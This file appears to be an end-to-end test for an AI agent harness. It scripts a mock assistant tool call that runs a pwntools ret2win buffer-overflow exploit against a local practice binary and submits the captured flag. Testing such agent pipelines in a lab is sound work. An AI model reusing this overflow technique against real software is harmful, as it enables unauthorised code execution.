"""Run the REAL harness against a REAL compiled ret2win binary, inside a Linux
container that has pwntools + gdb. The scripted gateway drives the pwn workflow via
python_exec: build a ROP payload with pwntools, jump to win(), read the printed
flag. Auto-scan submits it. This proves the pwn path end to end on Linux.

Run inside the pwn e2e image (testrig/pwn/Dockerfile.e2e):
    docker run --rm dh-pwn-e2e
"""
from __future__ import annotations

import json
import os
import socket
import sys
import threading
import time

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from harness.config import Config
from harness.flags import FlagSubmitter
from harness.gateway import Gateway
from harness.loop import RunResult, run
from harness.runtime import RunContext
from testrig.mock_gateway import make_gateway_server

VULN = "/workspace/vuln"
FLAG_FILE = "/workspace/flag.txt"

EXPLOIT = f"""
from pwn import *
context.log_level = 'error'
e = context.binary = ELF({VULN!r})
ret = next(e.search(asm('ret'), executable=True))   # avoid ROPgadget; a bare ret for alignment
io = process({VULN!r})
io.recvuntil(b'name?')
io.send(flat(b'A'*72, ret, e.symbols['win']))   # 64 buf + 8 saved rbp, ret aligns the stack for win()
print(io.recvall(timeout=3).decode(errors='replace'))
io.close()
"""


def _free_port() -> int:
    s = socket.socket()
    s.bind(("127.0.0.1", 0))
    port = s.getsockname()[1]
    s.close()
    return port


def pwn_script() -> list[dict]:
    return [{
        "role": "assistant", "content": None,
        "tool_calls": [{"id": "p1", "type": "function",
                        "function": {"name": "python_exec",
                                     "arguments": json.dumps({"code": EXPLOIT, "timeout": 60})}}],
    }]


def run_pwn_rig() -> RunResult:
    with open(FLAG_FILE) as fh:
        flag = fh.read().strip()
    gw_port = _free_port()
    server = make_gateway_server(gw_port, pwn_script(), flag)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    base = f"http://127.0.0.1:{gw_port}/v1"
    env = {
        "BOXR_RUN_ID": "pwn-e2e", "BOXR_AGENT_TOKEN": "tok",
        "BOXR_PROVIDER_BASE_URL": base,
        "BOXR_EVENT_ENDPOINT": f"http://127.0.0.1:{gw_port}/events",
        "BOXR_FLAG_ENDPOINT": f"http://127.0.0.1:{gw_port}/flag",
        "BOXR_MODEL": "test/model", "BOXR_MODELS": "test/model",
        "BOXR_OBJECTIVE": "exploit the binary and read the flag",
        "BOXR_MAX_WALL_CLOCK_SEC": "120", "BOXR_MAX_COST_MICRO_USD": "5000000",
    }
    task = {"objective": "exploit /workspace/vuln", "self": {"ip": "127.0.0.1"},
            "targets": [{"hostname": "127.0.0.1"}]}
    ctx = RunContext.from_env(env, task, now=time.monotonic())
    cfg = Config.load(None, ctx)
    gateway = Gateway(ctx.provider_base_url, ctx.agent_token, budget=ctx.budget)
    submitter = FlagSubmitter(ctx.flag_endpoint, ctx.event_endpoint, ctx.agent_token)
    try:
        return run(ctx, cfg, gateway=gateway, submitter=submitter)
    finally:
        server.shutdown()


if __name__ == "__main__":
    result = run_pwn_rig()
    print(f"PWN_E2E_RESULT {json.dumps({'reason': result.reason, 'turns': result.turns, 'flags_captured': result.flags_captured})}")
    sys.exit(0 if result.flags_captured == 1 else 1)
